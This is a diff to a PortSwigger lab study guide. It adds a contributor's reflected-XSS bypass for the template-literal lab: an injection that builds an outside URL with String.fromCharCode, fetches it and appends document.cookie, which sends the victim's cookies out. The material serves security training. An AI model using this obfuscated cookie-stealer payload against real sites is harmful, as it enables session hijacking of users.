@@ -747,9 +747,30 @@ ${alert(document.cookie)}
 
 ![xss template literal](images/xss-template-literal.png)  
   
->I failed to get a working cookie stealer bypassing all the filters for this lab......  
+>Thanks to ***Adrián Gyurácz***, for providing awesome bypass where I failed to get a working cookie stealer bypass all filters for this lab.  
+
+>***Adrián Gyurácz*** found the following research article from Portswigger that lead to the solution:  
+[bypassing-character-blocklists-with-unicode-overflows](https://portswigger.net/research/bypassing-character-blocklists-with-unicode-overflows)  
+
+#### Pivoting from above, his payload:  
+
+```
+${fetch(String.fromCharCode(0x68,0x74,0x74,0x70,0x73,0x3a,0x2f,0x2f,0x30,0x62,0x63,0x6f,0x31,0x68,0x62,0x62,0x32,0x66,0x72,0x75,0x61,0x39,0x6b,0x79,0x64,0x35,0x78,0x77,0x6c,0x31,0x71,0x37,0x77,0x79,0x32,0x70,0x71,0x6e,0x65,0x63,0x2e,0x6f,0x61,0x73,0x74,0x69,0x66,0x79,0x2e,0x63,0x6f,0x6d,0x3f,0x74,0x65,0x73,0x7a,0x74,0x3d) + document.cookie)}
+```  
+
+>As the original lab session cookie has protection flags, he created a test dummy cookie for proof of concept:  
+
+![Adrián Gyurácz](/images/ag1.png)  
+
+>after sending the payload in the search function, I got a cookie stealer hit:  
+
+![Adrián Gyurácz](/images/ag2.png)  
+
+>I hope others find his research helpful, and including it in my guide Tx.  
 
 [PortSwigger Lab: Reflected XSS into a template literal with angle brackets, single, double quotes, backslash and backticks Unicode-escaped](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-template-literal-angle-brackets-single-double-quotes-backslash-backticks-escaped)  
+
+----  
 
 ### XSS via JSON into EVAL  
 
